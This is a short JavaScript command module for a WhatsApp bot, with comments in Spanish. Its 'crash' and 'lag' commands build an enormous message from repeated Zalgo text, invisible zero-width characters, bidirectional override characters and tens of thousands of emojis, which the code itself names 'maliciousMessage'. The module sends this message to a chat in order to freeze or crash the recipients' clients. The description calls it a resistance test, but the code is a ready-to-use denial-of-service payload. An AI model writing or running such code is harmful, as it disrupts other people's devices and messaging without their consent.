const { PREFIX } = require("../../krampus");

module.exports = {
  name: "crash-test",
  description: "Envía un mensaje diseñado para probar la resistencia del cliente.",
  commands: ["crash", "lag"],
  usage: `${PREFIX}crash`,
  handle: async ({ socket, remoteJid }) => {
    try {
      const krampusZalgo = "K̷̘͇̹͓̻͉̖͛͂͗̍̄̄̕͜͠Ȑ̸̘͓̲̺̖͕̞̺̞͎̗̱̓̄̍̓̓̋̍ͅA̵̡͕͇̲̳͓̞̥͎͙̞̍͗̿̎̓̏̐̈́̕̕͝͝M̶̨͓̠̙̟̪̞̘̩̱̖̗̟̈́͑̈́͂̋̽̇̋̽̚͘P̶̩̘̦̝̪̮̠̫̩̠͎͖̯͌̈́͐̎͒̏͋̐̆̾̓̋̿U̷̘̗͇͚̬̥̠̜͖̬̍̒̌̿̑͗̈́̿̈́̏̆̓͜͜͠S̴̛͓͔̦̮̼̝͉̈́́̎̏̾̀̾̒̅̓".repeat(70000);
      const invisibles = "\u200B\u200C\u200D\u2060".repeat(10000);
      const directionals = "\u202E\u202D".repeat(70000);
      const emojis = "🦌".repeat(50000); // Cambiable por otros emojis según la prueba

      const maliciousMessage = krampusZalgo + invisibles + directionals + emojis;

      await socket.sendMessage(remoteJid, {
        text: maliciousMessage,
      });
    } catch (error) {
      console.error("Error en crash-test:", error);
    }
  },
};